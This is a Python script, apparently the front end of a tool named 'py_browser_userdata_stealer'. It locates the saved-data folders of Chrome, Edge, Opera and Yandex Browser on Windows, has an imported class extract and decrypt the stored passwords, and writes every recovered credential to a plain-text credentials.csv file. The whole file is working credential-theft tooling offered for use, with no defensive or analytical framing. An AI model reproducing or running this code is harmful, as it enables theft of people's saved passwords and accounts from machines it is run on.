#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import textwrap

from py_browser_userdata_stealer.chromium_based import ChromiumBased

# Chromium based browser's name, User Data path
chromium_browsers = [
    ("Google Chrome", os.path.normpath(os.getenv("LOCALAPPDATA") + 
    "/Google/Chrome/User Data")),
    ("Microsoft Edge", os.path.normpath(os.getenv("LOCALAPPDATA") + 
    "/Microsoft/Edge/User Data")),
    ("Opera", os.path.normpath(os.getenv("APPDATA") + 
    "/Opera Software/Opera Stable")),
    ("Yandex Browser", os.path.normpath(os.getenv("LOCALAPPDATA") + 
    "/Yandex/YandexBrowser/User Data"))
]

def main():
    print("Console app that searches for browser's credentials and saves it to .csv file\n")

    installed_browsers = []

    for name, path in chromium_browsers:
        if os.path.exists(path):
            browser = ChromiumBased(name, path)
            installed_browsers.append(browser)

    if not installed_browsers:
        sys.exit("No browsers found")

    indent = " "*4
    wrapper = textwrap.TextWrapper(initial_indent=indent, subsequent_indent=indent)

    out_file = "credentials.csv"
    with open(out_file, 'w', encoding='utf-8') as f:
        for browser in installed_browsers:
            print(browser.name + ":")
            
            credentials = browser.get_credentials()
            if credentials:
                print(wrapper.fill("Found {} credentials".format(len(credentials))))
                error_count = sum("%ERROR%" in r[2] for r in credentials)
                if error_count > 0:
                    print(wrapper.fill("At least {} passwords failed to decrypt".format(error_count)))

                f.write(browser.name + "\n")
                for row in credentials:
                    line = ";".join(row)
                    f.write(line + "\n")
                f.write("\n")
            else:
                print(wrapper.fill("No credentials found"))

            print()

    if os.stat(out_file).st_size != 0:
        print("\nFile \"{}\" has been successfully created".format(out_file))
    else:
        print("\nFile \"{}\" wasn't created".format(out_file))
        os.remove(out_file)

if __name__ == "__main__":
    main()
